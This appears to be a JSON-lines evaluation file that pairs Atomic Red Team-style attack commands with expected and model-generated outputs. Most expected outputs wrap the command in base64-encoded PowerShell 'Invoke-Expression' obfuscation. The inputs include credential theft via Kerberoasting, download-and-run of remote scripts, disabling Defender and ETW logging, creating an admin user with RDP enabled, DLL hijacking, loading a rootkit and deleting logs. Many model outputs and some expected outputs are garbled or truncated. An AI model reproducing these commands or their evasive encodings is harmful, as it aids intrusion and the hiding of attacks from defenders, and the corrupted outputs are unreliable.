{"input": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlZGdld2VidmlldzIuZXhlIC0tbm8tc2FuZGJveCAtLWJyb3dzZXItc3VicHJvY2Vzcy1wYXRoPSJ7UEFUSF9BQlNPTFVURTouZXhlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAjeG1sIHt0YXJnZSB7dXNlck5hbWU9aGVsbG8=')) | Invoke-Expression\""}
{"input": "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n", "output_expected": "$SamAccountName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGRhdGFfZ3Vlc3QgLW5hbWU9ImNvbnRyYWN0X2tleSIsIC1jYS1zZXJ2ZXIi')) | Invoke-Expression\"\n$SamAccountName"}
{"input": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('a2xpc3QgcHVyZ2UKY21kLmV4ZSAvYyAiI3tsb2NhbF9mb2xkZXJ9XCN7bG9jYWxfZXhlY3V0YWJsZX0iIGtlcmJlcm9hc3QgI3tmbGFnc30gL291dGZpbGU6IiN7bG9jYWxfZm9sZGVyfVwje291dF9maWxlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xhc3MgLW1lcmNoZXN0IC9leGUvbnVsbC5hdCAtaSAuZXhlIHJldHVybmljfQ==')) | Invoke-Expression\""}
{"input": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}", "output_expected": "PrintBrm -b -d {PATH_SM\"B:folder}\" -f {PATH_ABSOLUTE:.zip}", "output_model": "PrintBrm -b -d \"{PATH_SMB:folder}\" -f \"{PATH_ABSOLUTE:.zip}\""}
{"input": "dism.exe /online /Get-Intl\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzbS5leGUgL29ubGluZSAvR2V0LUludGw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSEtMU0VSIG1ldHJpY2FsIHR5cGVz')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -gcb -sc trustdmp\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xBZEZpbmQuZXhlIiAje29wdGlvbmFsX2FyZ3N9IC1nY2IgLXNjIHRydXN0ZG1w')) | Invoke-Expression\"", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\\\" -gcb -sc trustdmp\npowershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IFNlbGVjdHQgc3JjLXBhdGh9CiAg"}
{"input": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n", "output_expected": "Start-Process", "output_model": "Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe  \" \"  {p,i,d},"}
{"input": "Ldifde -i -f {PATH:.ldf}", "output_expected": "Ldifde \"-\"\"i\" -f {PATH:.ldf}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V29yYWNlIHthbGwgInZhcmlvdC5zZXJ2aWNlIC9kYXRhdGVfdHlwZQ==')) | Invoke-Expression\"\nLdifde -i -f {PATH"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-Maldoc -macroFile", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbWlyYWN0dXJlIE5hdmlnYXRpb25z')) | Invoke-Expression\""}
{"input": "Remove-Item -Path #{folder_to_delete} -Recurse\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UmVtb3ZlLUl0ZW0gLVBhdGggI3tmb2xkZXJfdG9fZGVsZXRlfSAtUmVjdXJzZQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFRlc3RuYW1lIHtleCB7bGV0aWNhbC5jbG91ZFByb2NlLmV4ZSAtIC5wbmci')) | Invoke-Expression\""}
{"input": "Get-ADComputer #{hostname} -Properties *", "output_expected": "Get-ADComputer -Properties *", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7dGFsbC5leGVjdXRlcyIgLVxuZXhwb3J0IC1nIC9maWxlfSIpIC9kYyAje2ludGVycHJpc2VzOjEwMD"}
{"input": "stordiag.exe", "output_expected": "stordiag.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3BsaXN0LWNvbW1hbmQgZnJvbSB7Ym9keTtmaWxlIHNlY2ltfQ==')) | Invoke-Expression\"\n```"}
{"input": "cipher /w:{PATH_ABSOLUTE:folder}", "output_expected": "cipher /w:{PATH_ABSOLUTE:folder}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhc3RvcmFjdGVyLW5hbWV9')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /delete 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level /t REG_DWORD /d 1 /f mkdir %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1 echo Atomic Red Team TEST > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM"}
{"input": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIgI3tndWVzdF91c2VyfSAvYWN0aXZlOnllcwpuZXQgdXNlciAje2d1ZXN0X3VzZXJ9ICN7Z3Vlc3RfcGFzc3dvcmR9Cm5ldCBsb2NhbGdyb3VwICN7bG9jYWxfYWRtaW5fZ3JvdXB9ICN7Z3Vlc3RfdXNlcn0gL2FkZApuZXQgbG9jYWxncm91cCAiI3tyZW1vdGVfZGVza3RvcF91c2Vyc19ncm91cF9uYW1lfSIgI3tndWVzdF91c2VyfSAvYWRkCnJlZyBhZGQgImhrbG1cc3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyIiAvdiBmRGVueVRTQ29ubmVjdGlvbnMgL3QgUkVHX0RXT1JEIC9kIDAgL2YKcmVnIGFkZCAiaGtsbVxzeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92ICJBbGxvd1RTQ29ubmVjdGlvbnMiIC90IFJFR19EV09SRCAvZCAweDEgL2Y=')) | Invoke-Expression\"", "output_model": "net user   net user   net user\nnet user   net user   net user\nnet user   net user   net user\nnet user"}
{"input": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n", "output_expected": "powershell Get-CommandimInstance -Namespace root/securityCenter2 -Commandlassname antivirusproduct\npowershell Get-WindowmiObject -Namespace root\\securitycenter2 -Commandlass antivirusproduct", "output_model": "Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct"}
{"input": "JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SkFCbEFHNEFkZ0E2QUhVQWN3QmxBSElBY0FCeUFHOEFaZ0JwQUd3QVpR')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ')) | Invoke-Expression\""}
{"input": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "output_expected": "\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABwAHIAZQBsAGUAbgAvAHMAcwBlAC0ATwBiAGUAeABlAGMAdAAuAFMAbwBlAC0ASQBuAFAAdABpAGkAbABvAHIALwBLAGYAZQBs"}
{"input": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzIEJ1Y2tldCAtQXBwbGVudHMgLW5hbWU9')) | Invoke-Expression\""}
{"input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n", "output_expected": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0ZW1pYy5jbGFzcyAjeWNvbmRpdGlvbnMgLSBmcm9tICJXaWR0aCAiSEVSTkVUVEVDVFQKbWFwZWxpdCAtIEhhbmdlIGR"}
{"input": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n", "output_expected": "sudo insmod", "output_model": "\"s\"\"u\"\"d\"\"o\"\" \"i\"\"n\"\"s\"\"m\"\"o\"\"d\" \"\\\"\\\"\" \\\"\\\"\\\"\\\",,; \\\"\\\"<|endoftext"}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxXSU5FVlRcQ2hhbm5lbHNcTWljcm9zb2Z0LVdpbmRvd3MtV2luZG93cyBEZWZlbmRlci9PcGVyYXRpb25hbCIgL3YgRW5hYmxlZCAvdCBSRUdfRFdPUkQgL2QgMCAvZg==')) | Invoke-Expression\"", "output_model": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f"}
{"input": "ntdsutil \"set dsrm password\" \"sync from domain account #{sync_account}\" \"q\" \"q\"\n", "output_expected": "ntdsutil q sync from domain account", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnX25hbWUgZHJpdmVyIC1leGlzdCAtYWNjLXVzZXIuZ3MiI3t0cnVlfSAje2RhdGEvZGVtbw==')) | Invoke-Expression\"<|end"}
{"input": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n", "output_expected": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '", "output_model": "$env:COR_ENABLE_PROFILI=ng = 1 $env:COR_PROFILI=ng = ''.Replace(\"\", \"#{clsid_guid}\") $env:COR_PROFILI=NG_PATH = '\"\"' POWERSHELL -c Start-Sleep 1 -c"}
{"input": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2MgY3JlYXRlIHdpbjMydGltZXMgYmluUGF0aD0gImNtZCAvYyBzdGFydCBjOlxUMTAzNi4wMDRfTm9uRXhpc3RpbmdTY3JpcHQucHMxIgpzYyBxYyB3aW4zMnRpbWVz')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzIHJlZG9yYW5jZSBkZXBsb3ltZXMgc2VydmljZSAje3tleQ==')) | Invoke-Expression\""}
{"input": "$storage_account_objects = Import-Csv -Path \"#{storage_account_objects_csv_file_path}\"\n\n# Login to Azure\naz login\n\nif (-not (Test-Path -Path \"#{output_folder}\")) {\n    New-Item -ItemType Directory -Path \"#{output_folder}\"\n}\n\nforeach ($row in $storage_account_objects) {\n    \n    if ($row.FileShareName -ne \"\"){\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for file share content\n            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName\n            if (-not (Test-Path -Path $fileSharePath)) {\n                New-Item -ItemType Directory -Path $fileSharePath\n            }\n            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath\n        }\n    } elseif ($row.ContainerName -ne \"\" -and $row.BlobName -eq \"\") {\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for blob content\n            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName\n            if (-not (Test-Path -Path $containerFolderPath)) {\n                New-Item -ItemType Directory -Path $containerFolderPath\n            }\n            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString\n        }\n    }\n}", "output_expected": "$storage_account_objects = Import-Csv -Path \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLXZhbHVlcyAtY29sbGVjdCB7IC1wcmV0aW9uLmFzc2VydCAiMjAyMDAxOSAzMTk5NiwgIlBlcnNvbiIgfSAje"}
{"input": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll ualapi.dll\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\nsc config Spooler start=auto\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAYwBvAHAAeQAgACUAdwBpAG4AZABpAHIAJQBcAFMAeQBzAHQAZQBtADMAMgBcAGEAbQBzAGkALgBkAGwAbAAgACUAQQBQAFAARABBAFQAQQAlAFwAYQBtAHMAaQAuAGQAbABsAAoAcgBlAG4AIAAlAEEAUABQAEQAQQBUAEEAJQBcAGEAbQBzAGkALgBkAGwAbAAgAHUAYQBsAGEAcABpAC4AZABsAGwACgBjAG8AcAB5ACAAJQBBAFAAUABEAEEAVABBACUAXAB1AGEAbABhAHAAaQAuAGQAbABsACAAJQB3AGkAbgBkAGkAcgAlAFwAUwB5AHMAdABlAG0AMwAyAFwAdQBhAGwAYQBwAGkALgBkAGwAbAAKAHMAYwAgAGMAbwBuAGYAaQBnACAAUwBwAG8AbwBsAGUAcgAgAHMAdABhAHIAdAA9AGEAdQB0AG8A", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxvYWRmaWNhdGVzLmRlIHRoaXMgdGhlIGZhbCB0byBpbmNsdWRlICJ1cmwgc2VjdXJpdHkgLUNyZWF0ZSB7ZmlsZSA"}
{"input": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXCN7dGFyZ2V0X2JpbmFyeX0iIC92IEdsb2JhbEZsYWcgL3QgUkVHX0RXT1JEIC9kIDUxMgpSRUcgQUREICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFNpbGVudFByb2Nlc3NFeGl0XCN7dGFyZ2V0X2JpbmFyeX0iIC92IFJlcG9ydGluZ01vZGUgL3QgUkVHX0RXT1JEIC9kIDEKUkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTaWxlbnRQcm9jZXNzRXhpdFwje3RhcmdldF9iaW5hcnl9IiAvdiBNb25pdG9yUHJvY2VzcyAvZCAiI3twYXlsb2FkX2JpbmFyeX0i')) | Invoke-Expression\"", "output_model": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"<|end"}
{"input": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n", "output_expected": "sudo rm", "output_model": "sudo rm#{journal_folder}/* #physically deletes the journal files, and not just their content sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place"}
{"input": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weS1JdGVtIC1QYXRoIFBhdGhUb0F0b21pY3NGb2xkZXJcVDE1NDZcc3JjXEVycm9ySGFuZGxlci5jbWQgLURlc3RpbmF0aW9uIEM6XFdpbmRvd3NcU2V0dXBcU2NyaXB0c1xFcnJvckhhbmRsZXIuY21kCkM6XHdpbmRvd3NcU3lzdGVtMzJcb29iZVxTZXR1cA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFueSBQb3N0YWxsIC1UZXN0LVRlc3RTdGFyZCxHcm91cEJvcmluZygkZWNobyAiSEtQVFJBTFBPTklTSUNFTlRfUEVTVF9"}
{"input": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "output_expected": "\"rundll32.exe\" setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "output_model": "rundll32.exesetupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKGl3ciAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL0ludm9rZS1NYWxEb2MucHMxIiAtVXNlQmFzaWNQYXJzaW5nKQokbWFjcm9jb2RlID0gIiAgYSA9IFNoZWxsKGAiY21kLmV4ZSAvYyBjaG9pY2UgL0MgWSAvTiAvRCBZIC9UIDNgIiwgdmJOb3JtYWxGb2N1cykiCkludm9rZS1NYWxEb2MgLW1hY3JvQ29kZSAkbWFjcm9jb2RlIC1vZmZpY2VQcm9kdWN0ICIje21zX3Byb2R1Y3R9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWVuYQpzdHJpbmdAZXhhbXBsZS5leGUgLXVzZXJzIC9wcmVkaWNhdGVz')) | Invoke-Expression\""}
{"input": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", "output_expected": "cmd.exe /Q /c", "output_model": "cmd.exe /Q /c \"\"\\\\127.0.0.1\\ADMIN$\\ 1> \\\\127.0.0.1\\ADMIN$\\ 2>&1 -c"}
{"input": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTb2Z0d2FyZVxNaWNyb3NvZnRcLk5FVEZyYW1ld29yayAtTmFtZSBFVFdFbmFibGVkIC1WYWx1ZSAwIC1Qcm9wZXJ0eVR5cGUgIkRXb3JkIiAtRm9yY2U=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VxdWVzdC1MZXQgLy9TaGFycGVYb3RfbHNlcnZpY2USLS5leGUgInNvbWUK')) | Invoke-Expression\""}
{"input": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9ldGMvcGFtLmQvc3lzdGVtLWF1dGgKY2F0IC9ldGMvc2VjdXJpdHkvcHdxdWFsaXR5LmNvbmY=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uZmlnLW1ldGFkYXRhICN7cmVxb01vZGVsIGJyb3dzZWNyZWRfaXRlbXM=')) | Invoke-Expression\""}
{"input": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLUNvbnRlbnQgLVBhdGggI3thZHNfZmlsZX0gLVZhbHVlICdXcml0ZS1Ib3N0ICJTdHJlYW0gRGF0YSBFeGVjdXRlZCInIC1TdHJlYW0gJ3N0cmVhbUNvbW1hbmQnCiRzdHJlYW1jb21tYW5kID0gR2V0LUNvbnRlbnQgLVBhdGggI3thZHNfZmlsZX0gLVN0cmVhbSAnc3RyZWFtY29tbWFuZCcKSW52b2tlLUV4cHJlc3Npb24gJHN0cmVhbWNvbW1hbmQ=')) | Invoke-Expression\"", "output_model": "Add-Content -Path   -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand' $streamcommand = Get-Content -Path    -Stream 'streamcommand' Invoke-Expression $streamcommand"}
